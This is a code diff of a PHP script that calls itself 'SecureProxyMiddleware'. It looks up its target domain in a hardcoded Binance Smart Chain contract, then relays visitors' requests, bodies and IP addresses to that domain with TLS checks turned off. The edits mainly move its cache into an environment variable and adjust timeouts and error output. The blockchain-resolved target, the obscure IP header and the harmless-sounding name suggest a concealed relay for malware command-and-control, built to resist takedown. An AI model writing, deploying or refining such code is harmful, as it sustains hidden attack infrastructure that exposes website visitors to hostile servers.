@@ -1,77 +1,43 @@
 <?php
 header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: *');
+header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
 header('Access-Control-Allow-Headers: *');
 header('Access-Control-Max-Age: 3600');
 
 function getClientIP() {
-    // Check for Cloudflare IP
     if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
         return $_SERVER["HTTP_CF_CONNECTING_IP"];
     }
-    
-    // Check X-Forwarded-For
     if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        // Get first IP in chain
         $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
         return trim($ips[0]);
     }
-    
-    // Fallback to direct IP
     return $_SERVER['REMOTE_ADDR'];
 }
-
 
 class SecureProxyMiddleware {
     private $updateInterval = 60;
     private $rpcUrls;
     private $contractAddress;
-    private $cacheFile;
-    
+    private $cache;
+
     public function __construct($options = []) {
         $this->rpcUrls = $options['rpcUrls'] ?? [
-            // "https://rpc.ankr.com/bsc",
             "https://binance.llamarpc.com",
             "https://bsc.blockrazor.xyz",
             "https://bsc.therpc.io",
             "https://bsc-dataseed2.bnbchain.org"
         ];
         $this->contractAddress = $options['contractAddress'] ?? "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
-        
-        $serverIdentifier = md5(
-            $_SERVER['SERVER_NAME'] . ':' . 
-            $_SERVER['SERVER_ADDR'] . ':' . 
-            $_SERVER['SERVER_SOFTWARE']
-        );
-        $this->cacheFile = sys_get_temp_dir() . '/proxy_cache_' . $serverIdentifier . '.json';
-    }
-
-    private function loadCache() {
-        if (!file_exists($this->cacheFile)) return null;
-        $cache = json_decode(file_get_contents($this->cacheFile), true);
-        if (!$cache || (time() - $cache['timestamp']) > $this->updateInterval) {
-            return null;
+        $this->cache = json_decode(getenv('PROXY_CACHE') ?: '{}', true);
+        if (!$this->cache || (time() - ($this->cache['timestamp'] ?? 0)) > $this->updateInterval) {
+            $this->cache = null;
         }
-        return $cache['domain'];
-    }
-
-    private function filterHeaders($headers) {
-        $blacklist = ['host'];
-        $formatted = [];
-        
-        foreach ($headers as $key => $value) {
-            $key = strtolower($key);
-            if (!in_array($key, $blacklist)) {
-                $formatted[] = "$key: $value";
-            }
-        }
-        
-        return $formatted;
     }
 
     private function saveCache($domain) {
-        $cache = ['domain' => $domain, 'timestamp' => time()];
-        file_put_contents($this->cacheFile, json_encode($cache));
+        $this->cache = ['domain' => $domain, 'timestamp' => time()];
+        putenv("PROXY_CACHE=" . json_encode($this->cache));
     }
 
     private function hexToString($hex) {
@@ -91,7 +57,6 @@ class SecureProxyMiddleware {
 
     private function fetchTargetDomain() {
         $data = '20965255';
-        
         foreach ($this->rpcUrls as $rpcUrl) {
             try {
                 $ch = curl_init($rpcUrl);
@@ -108,21 +73,18 @@ class SecureProxyMiddleware {
                         ], 'latest']
                     ]),
                     CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
-                    CURLOPT_TIMEOUT => 120,
+                    CURLOPT_TIMEOUT => 30,
                     CURLOPT_SSL_VERIFYPEER => false,
                     CURLOPT_SSL_VERIFYHOST => false
                 ]);
-
                 $response = curl_exec($ch);
                 if (curl_errno($ch)) {
                     curl_close($ch);
                     continue;
                 }
-                
                 curl_close($ch);
                 $responseData = json_decode($response, true);
                 if (isset($responseData['error'])) continue;
-
                 $domain = $this->hexToString($responseData['result']);
                 if ($domain) return $domain;
             } catch (Exception $e) {
@@ -133,9 +95,7 @@ class SecureProxyMiddleware {
     }
 
     private function getTargetDomain() {
-        $cachedDomain = $this->loadCache();
-        if ($cachedDomain) return $cachedDomain;
-
+        if ($this->cache && isset($this->cache['domain'])) return $this->cache['domain'];
         $domain = $this->fetchTargetDomain();
         $this->saveCache($domain);
         return $domain;
@@ -155,16 +115,10 @@ class SecureProxyMiddleware {
             $targetDomain = rtrim($this->getTargetDomain(), '/');
             $endpoint = '/' . ltrim($endpoint, '/');
             $url = $targetDomain . $endpoint;
-            
             $clientIP = getClientIP();
-
             $headers = getallheaders();
-            // $headers = $this->filterHeaders($headers);
-            unset($headers['Host'], $headers['host']);
-            unset($headers['origin'], $headers['Origin']);
-            unset($headers['Accept-Encoding'], $headers['Content-Encoding']);
-            unset($headers['Content-Encoding'], $headers['content-encoding']);
-        
+            unset($headers['Host'], $headers['host'], $headers['Origin'], $headers['origin']);
+            unset($headers['Accept-Encoding'], $headers['Content-Encoding'], $headers['content-encoding']);
             $headers['x-dfkjldifjlifjd'] = $clientIP;
             $ch = curl_init($url);
             curl_setopt_array($ch, [
@@ -172,49 +126,41 @@ class SecureProxyMiddleware {
                 CURLOPT_POSTFIELDS => file_get_contents('php://input'),
                 CURLOPT_RETURNTRANSFER => true,
                 CURLOPT_HTTPHEADER => $this->formatHeaders($headers),
-                CURLOPT_TIMEOUT => 120,
+                CURLOPT_TIMEOUT => 30,
                 CURLOPT_FOLLOWLOCATION => true,
                 CURLOPT_SSL_VERIFYPEER => false,
                 CURLOPT_SSL_VERIFYHOST => false,
                 CURLOPT_ENCODING => ''
             ]);
-
             $response = curl_exec($ch);
             if (curl_errno($ch)) {
                 throw new Exception(curl_error($ch));
             }
-            
             $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
             $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
             curl_close($ch);
-
             header('Access-Control-Allow-Origin: *');
-            header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');
+            header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
             header('Access-Control-Allow-Headers: *');
             if ($contentType) header('Content-Type: ' . $contentType);
-            
             http_response_code($httpCode);
             echo $response;
-
         } catch (Exception $e) {
             http_response_code(500);
-            echo 'error' . $e;
+            header('Content-Type: application/json');
+            echo json_encode(['error' => 'Proxy error: ' . $e->getMessage()]);
         }
     }
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
-    header('Access-Control-Allow-Origin: *');
-    header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');
-    header('Access-Control-Allow-Headers: *');
-    header('Access-Control-Max-Age: 86400');
     http_response_code(204);
     exit;
 }
 
 if ($_GET['e'] === 'ping_proxy') {
-    header('Content-Type: text/plain');
-    echo 'pong';
+    header('Content-Type: application/json');
+    echo json_encode(['status' => 'pong']);
     exit;
 } else if (isset($_GET['e'])) {
     $proxy = new SecureProxyMiddleware([
@@ -227,9 +173,9 @@ if ($_GET['e'] === 'ping_proxy') {
         'contractAddress' => "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0"
     ]);
     $endpoint = urldecode($_GET['e']);
-    $endpoint = ltrim($endpoint, '/');
     $proxy->handle($endpoint);
 } else {
     http_response_code(400);
-    echo 'Missing endpoint';
+    header('Content-Type: application/json');
+    echo json_encode(['error' => 'Missing endpoint']);
 }
